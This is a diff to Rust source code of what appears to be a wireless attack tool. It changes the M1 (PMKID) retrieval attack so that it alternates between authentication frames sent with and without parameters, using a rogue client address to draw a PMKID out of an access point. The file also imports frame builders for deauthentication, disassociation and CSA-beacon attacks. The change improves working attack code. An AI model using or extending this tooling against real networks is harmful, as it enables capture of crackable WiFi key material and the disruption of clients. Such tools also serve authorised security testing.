@@ -17,10 +17,10 @@ use nl80211_ng::channels::WiFiBand;
 use crate::{
     status::{MessageType, StatusMessage},
     tx::{
-        build_association_request_rg, build_authentication_frame_noack, build_csa_beacon,
-        build_deauthentication_fm_ap, build_deauthentication_fm_client,
-        build_disassocation_from_ap, build_disassocation_from_client, build_probe_response,
-        build_reassociation_request,
+        build_association_request_rg, build_authentication_frame_noack,
+        build_authentication_frame_with_params, build_csa_beacon, build_deauthentication_fm_ap,
+        build_deauthentication_fm_client, build_disassocation_from_ap,
+        build_disassocation_from_client, build_probe_response, build_reassociation_request,
     },
     write_packet, OxideRuntime,
 };
@@ -178,7 +178,7 @@ pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<
 //                                                          //
 //             M1 (PMKID) Retreival Attack                  //
 //   This form of attack is two-stage process that will     //
-//   attempt to silicit an AP for a PMKID by authenticating //
+//   attempt to elicit an AP for a PMKID by authenticating  //
 //   and associating with the access point. Given the       //
 //   correct parameters the AP will send an EAPOL M1 to     //
 //   us, which may contain PMKID.                           //
@@ -190,7 +190,7 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
     if oxide.config.notx {
         return Ok(());
     }
-    
+
     // get AP object, if there isn't one, return (this shouldn't happen).
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
         dev
@@ -241,12 +241,20 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
     }
 
     // Make an authentication frame (no_ack), so we don't over-send.
-    // TODO: Probably add some sort of "noise" flag that uses ack (so we send retries when necessary)
-    let frx = build_authentication_frame_noack(
-        ap_mac,
-        &oxide.target_data.rogue_client,
-        oxide.counters.sequence2(),
-    );
+    // This will flip between sending params and not sending, hopefully one of them works.
+    let frx = if oxide.counters.seq2 % 2 == 0 {
+        build_authentication_frame_noack(
+            ap_mac,
+            &oxide.target_data.rogue_client,
+            oxide.counters.sequence2(),
+        )
+    } else {
+        build_authentication_frame_with_params(
+            ap_mac,
+            &oxide.target_data.rogue_client,
+            oxide.counters.sequence2(),
+        )
+    };
 
     // If we are transmitting
     if !oxide.config.notx {
